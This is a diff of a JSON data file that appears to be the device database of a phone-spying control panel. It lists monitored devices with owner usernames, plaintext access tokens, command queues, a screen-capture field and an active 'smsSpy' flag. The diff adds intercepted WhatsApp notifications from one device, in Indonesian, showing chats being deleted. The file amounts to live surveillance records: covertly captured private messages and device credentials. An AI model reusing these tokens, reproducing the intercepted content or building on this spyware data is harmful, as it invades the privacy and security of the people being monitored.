@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781900535,
+    "lastSeen": 1776781903989,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781900771,
+    "lastSeen": 1776781903852,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Menghapus obrolan terpilih…",
+        "content": "100%",
+        "time": "21/04 21:31",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781905328
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Menghapus obrolan terpilih…",
+        "content": "‎0 dari 4 (100%)",
+        "time": "21/04 21:31",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781904966
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Menghapus obrolan terpilih…",
+        "content": "‎0 dari 4 (68%)",
+        "time": "21/04 21:31",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781904589
+      },
       {
         "appName": "WhatsApp",
         "sender": "Menghapus obrolan terpilih…",
